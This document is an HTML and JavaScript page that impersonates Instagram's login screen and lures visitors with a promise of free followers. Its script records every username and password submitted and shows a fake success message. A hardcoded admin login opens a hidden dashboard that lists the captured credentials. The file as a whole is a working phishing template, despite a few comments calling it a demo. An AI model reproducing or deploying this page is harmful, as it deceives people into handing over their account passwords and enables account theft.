
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram • Get 10K Followers Now</title>
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: #fafafa;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      width: 350px;
      background: white;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      padding: 10px 40px 30px;
      text-align: center;
    }
    .logo {
      font-family: 'Billabong', cursive;
      font-size: 3.5rem;
      margin: 22px 0 12px;
      color: #000;
    }
    input {
      width: 100%;
      padding: 9px 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      font-size: 0.9rem;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 7px;
      margin: 12px 0 8px;
      background: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
    }
    button:disabled {
      background: #b2dffc;
      cursor: not-allowed;
    }
    .admin-panel {
      display: none;
      margin-top: 30px;
      text-align: left;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 15px;
      font-size: 0.85rem;
    }
    th, td {
      border: 1px solid #dbdbdb;
      padding: 8px;
      text-align: left;
    }
    th {
      background: #f1f1f1;
    }
    .success-msg {
      color: #0095f6;
      margin: 15px 0;
      font-weight: 500;
    }
    .error-msg {
      color: #ed4956;
      margin: 10px 0;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">Instagram</div>
  
  <h3 style="color:#8e8e8e; font-weight: normal; margin:0 0 20px;">Get Free Followers & Likes</h3>

  <form id="fakeLoginForm">
    <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="off"/>
    <input type="password" id="password" placeholder="Password" required autocomplete="off"/>
    <button type="submit" id="loginBtn">Log In</button>
  </form>

  <div id="message" class="error-msg"></div>

  <!-- ─── ADMIN AREA ─────────────────────────────────────── -->
  <div id="adminPanel" class="admin-panel">
    <h3>Admin Dashboard — mr.krissu</h3>
    <p style="color:#555; font-size:0.9rem;">Collected logins:</p>
    <table id="loginsTable">
      <thead>
        <tr>
          <th>Username</th>
          <th>Password</th>
          <th>Time</th>
        </tr>
      </thead>
      <tbody id="loginsBody"></tbody>
    </table>
  </div>
</div>

<script>
// ─── Fake "database" using localStorage ──────────────────────────────
const STORAGE_KEY = "insta_fake_logins";
let isAdmin = false;

function getSavedLogins() {
  const data = localStorage.getItem(STORAGE_KEY);
  return data ? JSON.parse(data) : [];
}

function saveLogin(username, password) {
  const logins = getSavedLogins();
  logins.push({
    username,
    password,
    time: new Date().toLocaleString("en-IN", {timeZone: "Asia/Kolkata"})
  });
  localStorage.setItem(STORAGE_KEY, JSON.stringify(logins));
}

function showAdminPanel() {
  isAdmin = true;
  document.getElementById("fakeLoginForm").style.display = "none";
  document.getElementById("adminPanel").style.display = "block";
  
  const tbody = document.getElementById("loginsBody");
  tbody.innerHTML = "";

  getSavedLogins().forEach(entry => {
    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td>${entry.username}</td>
      <td>${entry.password}</td>
      <td>${entry.time}</td>
    `;
    tbody.appendChild(tr);
  });
}

// ─── Form submit ─────────────────────────────────────────────────────
document.getElementById("fakeLoginForm").addEventListener("submit", e => {
  e.preventDefault();
  
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const msgEl = document.getElementById("message");

  msgEl.className = "error-msg";
  msgEl.textContent = "";

  if (!username || !password) {
    msgEl.textContent = "Please fill in all fields";
    return;
  }

  // Admin check (VERY insecure — only for demo!)
  if (username.toLowerCase() === "mr.krissu" && password === "Krishna@112") {
    msgEl.className = "success-msg";
    msgEl.textContent = "Admin access granted!";
    setTimeout(showAdminPanel, 800);
    return;
  }

  // Normal "user" login → save & fake success
  saveLogin(username, password);

  msgEl.className = "success-msg";
  msgEl.textContent = "Connecting to Instagram... Redirecting in 3 seconds";

  setTimeout(() => {
    // You can change this to real instagram.com or keep fake message
    alert("Thank you! Followers will be added within 24 hours (fake message)");
    // window.location.href = "https://www.instagram.com/";
  }, 3000);
});

// Optional: show admin panel immediately if already logged in as admin (refresh)
if (localStorage.getItem("admin_logged_in") === "yes") {
  showAdminPanel();
}
</script>

</body>
</html>
